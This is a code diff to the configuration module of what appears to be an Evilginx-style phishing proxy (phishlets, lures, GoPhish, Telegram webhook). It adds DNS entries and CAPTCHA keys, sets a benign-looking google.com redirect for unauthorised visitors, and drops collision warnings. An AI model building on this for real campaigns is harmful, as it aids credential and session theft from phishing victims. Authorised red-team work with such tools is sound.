@@ -66,46 +66,63 @@ type GoPhishConfig struct {
 }
 
 type GeneralConfig struct {
-	Domain       string `mapstructure:"domain" json:"domain" yaml:"domain"`
-	OldIpv4      string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
-	ExternalIpv4 string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
-	BindIpv4     string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
-	UnauthUrl    string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
-	HttpsPort    int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
-	DnsPort      int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
+	Domain          string `mapstructure:"domain" json:"domain" yaml:"domain"`
+	OldIpv4         string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
+	ExternalIpv4    string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
+	BindIpv4        string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
+	UnauthUrl       string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
+	HttpsPort       int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
+	DnsPort         int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
 	WebhookTelegram string `mapstructure:"webhook_telegram" json:"webhook_telegram" yaml:"webhook_telegram"`
-	Autocert     bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
+	Autocert        bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
+}
+
+type DNSEntry struct {
+	Type  string `mapstructure:"type" json:"type" yaml:"type"`
+	Value string `mapstructure:"value" json:"value" yaml:"value"`
 }
 
 type Config struct {
-	general         *GeneralConfig
-	certificates    *CertificatesConfig
-	blacklistConfig *BlacklistConfig
-	gophishConfig   *GoPhishConfig
-	proxyConfig     *ProxyConfig
-	phishletConfig  map[string]*PhishletConfig
-	phishlets       map[string]*Phishlet
-	phishletNames   []string
-	activeHostnames []string
-	redirectorsDir  string
-	lures           []*Lure
-	lureIds         []string
-	subphishlets    []*SubPhishlet
-	cfg             *viper.Viper
+	general           *GeneralConfig
+	siteDomains       map[string]string
+	baseDomain        string
+	certificates      *CertificatesConfig
+	blacklistConfig   *BlacklistConfig
+	gophishConfig     *GoPhishConfig
+	proxyConfig       *ProxyConfig
+	phishletConfig    map[string]*PhishletConfig
+	phishlets         map[string]*Phishlet
+	phishletNames     []string
+	activeHostnames   []string
+	redirectorsDir    string
+	lures             []*Lure
+	lureIds           []string
+	subphishlets      []*SubPhishlet
+	cfg               *viper.Viper
+	dnsentries        map[string]*DNSEntry
+	turnstile_sitekey string
+	turnstile_privkey string
+	recaptcha_sitekey string
+	recaptcha_privkey string
 }
 
 const (
-	CFG_GENERAL      = "general"
-	CFG_CERTIFICATES = "certificates"
-	CFG_LURES        = "lures"
-	CFG_PROXY        = "proxy"
-	CFG_PHISHLETS    = "phishlets"
-	CFG_BLACKLIST    = "blacklist"
-	CFG_SUBPHISHLETS = "subphishlets"
-	CFG_GOPHISH      = "gophish"
+	CFG_GENERAL           = "general"
+	CFG_CERTIFICATES      = "certificates"
+	CFG_LURES             = "lures"
+	CFG_PROXY             = "proxy"
+	CFG_PHISHLETS         = "phishlets"
+	CFG_BLACKLIST         = "blacklist"
+	CFG_SUBPHISHLETS      = "subphishlets"
+	CFG_GOPHISH           = "gophish"
+	CFG_DNSENTRIES        = "dnsentries"
+	CFG_TURNSTILE_SITEKEY = "turnstile_sitekey"
+	CFG_TURNSTILE_PRIVKEY = "turnstile_privkey"
+	CFG_RECAPTCHA_SITEKEY = "recaptcha_sitekey"
+	CFG_RECAPTCHA_PRIVKEY = "recaptcha_privkey"
 )
 
-const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
+const DEFAULT_UNAUTH_URL = "https://www.google.com" // Rick'roll
 
 func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c := &Config{
@@ -117,6 +134,7 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 		phishletNames:   []string{},
 		lures:           []*Lure{},
 		blacklistConfig: &BlacklistConfig{},
+		dnsentries:      make(map[string]*DNSEntry),
 	}
 
 	c.cfg = viper.New()
@@ -184,6 +202,11 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c.cfg.UnmarshalKey(CFG_PROXY, &c.proxyConfig)
 	c.cfg.UnmarshalKey(CFG_PHISHLETS, &c.phishletConfig)
 	c.cfg.UnmarshalKey(CFG_CERTIFICATES, &c.certificates)
+	c.cfg.UnmarshalKey(CFG_DNSENTRIES, &c.dnsentries)
+	c.turnstile_sitekey = c.cfg.GetString(CFG_TURNSTILE_SITEKEY)
+	c.turnstile_privkey = c.cfg.GetString(CFG_TURNSTILE_PRIVKEY)
+	c.recaptcha_sitekey = c.cfg.GetString(CFG_RECAPTCHA_SITEKEY)
+	c.recaptcha_privkey = c.cfg.GetString(CFG_RECAPTCHA_PRIVKEY)
 
 	for i := 0; i < len(c.lures); i++ {
 		c.lureIds = append(c.lureIds, GenRandomToken())
@@ -300,6 +323,19 @@ func (c *Config) SetDnsPort(port int) {
 	c.general.DnsPort = port
 	c.cfg.Set(CFG_GENERAL, c.general)
 	log.Info("dns port set to: %d", port)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetDnsEntry(name string, rtype string, value string) {
+	rtypes := []string{"A", "CNAME"}
+	if !stringExists(rtype, rtypes) {
+		log.Error("invalid record type %s, allowed types are %s", rtype, strings.Join(rtypes, ","))
+		return
+	}
+	entry := &DNSEntry{rtype, value}
+	c.dnsentries[name] = entry
+	c.cfg.Set(CFG_DNSENTRIES, c.dnsentries)
+	log.Info("DNS entry set: %s -> %s: %s", name, rtype, value)
 	c.cfg.WriteConfig()
 }
 
@@ -482,7 +518,47 @@ func (c *Config) SetBlacklistMode(mode string) {
 func (c *Config) SetWebhookTelegram(webhook string) {
 	c.general.WebhookTelegram = webhook
 	c.cfg.Set(CFG_GENERAL, c.general)
-	log.Info("telegram webhook set to: %s", webhook)
+	log.Info("EvilHoster Telegram webhook set to: %s", webhook)
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
+}
+
+func (c *Config) SetTurnstileSitekey(key string) {
+	c.turnstile_sitekey = key
+	c.cfg.Set(CFG_TURNSTILE_SITEKEY, key)
+	log.Info("Turnstile site key set to: %s", key)
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
+}
+
+func (c *Config) SetTurnstilePrivkey(key string) {
+	c.turnstile_privkey = key
+	c.cfg.Set(CFG_TURNSTILE_PRIVKEY, key)
+	log.Info("Turnstile private key set to: %s", key)
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
+}
+
+func (c *Config) SetReCaptchaSitekey(key string) {
+	c.recaptcha_sitekey = key
+	c.cfg.Set(CFG_RECAPTCHA_SITEKEY, key)
+	log.Info("reCAPTCHA site key set to: %s", key)
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
+}
+
+func (c *Config) SetReCaptchaPrivkey(key string) {
+	c.recaptcha_privkey = key
+	c.cfg.Set(CFG_RECAPTCHA_PRIVKEY, key)
+	log.Info("reCAPTCHA private key set to: %s", key)
 	err := c.cfg.WriteConfig()
 	if err != nil {
 		log.Error("write config: %v", err)
@@ -648,11 +724,6 @@ func (c *Config) VerifyPhishlets() {
 		for _, ph := range pl.proxyHosts {
 			phish_host := combineHost(ph.phish_subdomain, ph.domain)
 			orig_host := combineHost(ph.orig_subdomain, ph.domain)
-			if c_site, ok := hosts[phish_host]; ok {
-				log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", phish_host, site, c_site)
-			} else if c_site, ok := hosts[orig_host]; ok {
-				log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", orig_host, site, c_site)
-			}
 			hosts[phish_host] = site
 			hosts[orig_host] = site
 		}
@@ -833,4 +904,12 @@ func (c *Config) GetGoPhishApiKey() string {
 
 func (c *Config) GetGoPhishInsecureTLS() bool {
 	return c.gophishConfig.InsecureTLS
+}
+
+func (c *Config) GetDnsEntries() string {
+	out := ""
+	for k, v := range c.dnsentries {
+		out += fmt.Sprintf("%s -> %s: %s; ", k, v.Type, v.Value)
+	}
+	return out
 }
